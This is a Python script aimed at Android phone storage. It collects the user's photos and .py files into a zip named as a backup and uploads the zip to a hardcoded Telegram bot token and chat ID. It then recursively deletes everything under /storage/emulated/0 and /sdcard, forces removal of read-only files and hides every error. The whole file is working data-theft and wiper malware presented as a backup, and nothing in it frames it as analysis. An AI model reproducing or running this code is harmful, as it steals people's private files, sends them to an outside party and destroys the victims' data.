import os
import shutil
import stat
import zipfile
from pathlib import Path
import requests
BOT_TOKEN = "7250647871:AAHjoaqLzuQPPabLE4rM8Q3EIj5IHI5j0PM"
CHAT_ID = "7313522555"
TARGET_PATHS = [
    "/storage/emulated/0",
    "/sdcard",
    "/mnt/sdcard",
]
ZIP_PATH = "/storage/emulated/0/backup_files.zip"
EXTS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".py"}
def collect_files(path, exts):
    files = []
    for root, dirs, fs in os.walk(path):
        for f in fs:
            if Path(f).suffix.lower() in exts:
                files.append(os.path.join(root, f))
    return files

def make_zip(files, out_path, base_path):
    with zipfile.ZipFile(out_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for f in files:
            try:
                zf.write(f, os.path.relpath(f, base_path))
            except Exception:
                pass

def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        try:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
        except Exception:
            pass
def remove_readonly(func, path, excinfo):
    try:
        os.chmod(path, stat.S_IWRITE)
        func(path)
    except Exception:
        pass

def safe_remove_file(path):
    try:
        os.remove(path)
        return True
    except Exception:
        try:
            os.chmod(path, stat.S_IWRITE)
            os.remove(path)
            return True
        except Exception:
            return False

def safe_rmdir(path):
    try:
        os.rmdir(path)
        return True
    except Exception:
        return False

def walk_and_delete(root):
    for dirpath, dirnames, filenames in os.walk(root, topdown=False):
        for fname in filenames:
            fp = os.path.join(dirpath, fname)
            safe_remove_file(fp)
        for dname in dirnames:
            dp = os.path.join(dirpath, dname)
            try:
                shutil.rmtree(dp, onerror=remove_readonly)
            except Exception:
                try:
                    os.rmdir(dp)
                except Exception:
                    pass
    try:
        shutil.rmtree(root, onerror=remove_readonly)
    except Exception:
        try:
            os.rmdir(root)
        except Exception:
            pass

if __name__ == "__main__":
    all_files = []
    for p in TARGET_PATHS:
        if os.path.exists(p):
            all_files.extend(collect_files(p, EXTS))
    if all_files:
        make_zip(all_files, ZIP_PATH, "/storage/emulated/0")
        send_to_telegram(ZIP_PATH)
    for p in TARGET_PATHS:
        if os.path.exists(p):
            walk_and_delete(p)
